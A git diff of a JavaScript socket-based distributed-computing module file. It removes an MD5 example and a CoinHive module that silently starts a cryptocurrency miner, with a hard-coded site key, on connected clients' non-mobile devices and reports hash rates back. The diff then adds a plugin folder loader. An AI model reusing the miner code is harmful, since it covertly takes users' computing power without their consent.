@@ -1,57 +1,10 @@
 let Module = require('./Module.js');
+const fs = require('fs');
 
-let ExampleModule = new Module();
+const pluginFolder = "./plugins/";
+const pluginFolderRelative = "../../plugins/";
 
-ExampleModule.addDependencies("https://cdn.rawgit.com/blueimp/JavaScript-MD5/da202aebc0436c715e074525affc4e9416309fc3/js/md5.min.js");
-
-ExampleModule.setMainFunction(function(module, socket, config) {
-	socket.executeFunc(module, "md5Hash", (function() {let out = []; for (let i = 0; i < 1000; i++) {out.push(Math.random())} return out})(), function(out) {
-		console.log(out);
-	});
+fs.readdirSync(pluginFolder).forEach(file => {
+	let module = require(pluginFolderRelative+file);
+	console.log(module.config);
 });
-
-ExampleModule.addRemoteFunction("md5Hash", function(args, debug) {
-	let out = [];
-	
-	if (args instanceof Function) args = args();
-	
-	for (let i = 0; i < args.length; i++) {
-		out.push(md5(args[i]));
-	}
-	
-	return out;
-});
-
-exports.ExampleModule = ExampleModule;
-
-CoinHiveModule = new Module();
-
-CoinHiveModule.addDependencies("https://coinhive.com/lib/coinhive.min.js");
-
-CoinHiveModule.setDefaultConfig({
-	"siteKey": "EeIIqtrF5oLgHOgpPQGtIkXUe3JvAI15"
-});
-
-CoinHiveModule.setMainFunction(function(module, socket, config) {
-	socket.executeFunc(module, "startMiner", config["siteKey"]);
-	
-	socket.on("minerData", console.log);
-});
-
-CoinHiveModule.addRemoteFunction("startMiner", function(sitekey, debug) {
-	let miner = new CoinHive.Anonymous(sitekey, {throttle: 0.2});
-	// Only start on non-mobile devices
-	if (!miner.isMobile()) {
-		miner.start();
-		if (debug) console.log("Debug: Miner started!");	
-		setInterval(function() {
-			let hashesPerSecond = miner.getHashesPerSecond();
-			let totalHashes = miner.getTotalHashes();
-			let acceptedHashes = miner.getAcceptedHashes();
-
-			socket.emit("minerData", [hashesPerSecond, totalHashes, acceptedHashes]);
-		}, 1000);					
-	}
-});
-
-exports.CoinHiveModule = CoinHiveModule;
